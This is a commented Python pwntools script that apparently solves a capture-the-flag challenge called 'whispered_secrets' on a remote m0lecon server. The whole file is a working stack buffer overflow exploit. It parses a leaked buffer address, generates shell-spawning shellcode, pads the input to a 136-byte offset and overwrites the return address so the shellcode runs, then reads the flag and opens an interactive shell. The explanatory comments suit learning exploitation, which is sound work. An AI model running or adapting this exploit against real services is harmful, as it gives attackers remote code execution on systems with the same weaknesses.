#!/usr/bin/env python3
from pwn import *

# From checksec:
# Stack:      No canary found   =>  buffer overflow vulnerability is present
# NX:         NX disabled       =>  the stack is executable, so we can execute code directly from the stack (e.g. by placing shellcode there)
# PIE:        No PIE (0x400000) =>  addresses are static and can be used directly in the exploit

context.binary = elf = ELF('./whispered_secrets', checksec=False)
context.arch = 'amd64'
context.os = 'linux'

OFFSET_TO_RIP = 136

p = remote("offsec.m0lecon.it", 13573)

leak_line = p.recvline_contains(b"secret:")
buf_addr = int(leak_line.split(b"secret: ")[1].strip(), 16)   # save the leaked address of the buffer for later use in the payload
log.info(f"buf = {buf_addr:#x}")    # print the leaked address of the buffer in hex

shellcode = asm(shellcraft.sh())    # generate shellcode using pwntools' shellcraft module. In this case, we generate shellcode for spawning a shell.

payload = flat(
    shellcode,      # the shellcode is placed at the beginning of the payload, so it will be written to the buffer when we send it to the program
    b"A" * (OFFSET_TO_RIP - len(shellcode)),    # padding to fill the space up to the RIP register (i.e. what we want to overwrite)
    p64(buf_addr),  # overwrite the RIP register with the address of the buffer where our shellcode is located, so that when the function returns, it will jump to our shellcode and execute it
)

p.sendafter(b"secret:\n", payload)

p.sendline(b"cat flag")

p.interactive()